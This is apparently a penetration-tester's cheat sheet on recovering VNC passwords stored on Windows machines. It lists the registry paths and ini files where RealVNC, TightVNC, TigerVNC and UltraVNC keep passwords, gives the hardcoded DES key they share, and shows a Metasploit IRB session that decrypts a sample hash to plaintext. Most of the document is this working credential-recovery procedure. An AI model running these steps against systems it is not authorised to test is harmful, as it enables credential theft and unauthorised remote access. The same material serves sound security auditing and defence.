# PasswordDecrypts
Handy Stored Password Decryption Techniques

## VNC

VNC uses a hardcoded DES key to store credentials.  The same key is used across multiple product lines.

RealVNC 
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver 
Value: Password 
 
TightVNC  
HKEY_CURRENT_USER\Software\TightVNC\Server 
tightvnc.ini  
vnc_viewer.ini 
Value: Password or PasswordViewOnly  

TigerVNC 
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 
Value: Password 

UltraVNC 
C:\Program Files\UltraVNC\ultravnc.ini 
Value: passwd or passwd2 


reg query

Once you have an encypted VNC password such as: 
d7a514d8c556aade 
you can decrypt it easily using the Metasploit Framework and the IRB (ruby shell) with these 3 commands:
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07" 
require 'rex/proto/rfb' 
Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey  

```BASH
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["d7a514d8c556aade"].pack('H*'), fixedkey
 => "Secure!\x00"
>> 
```

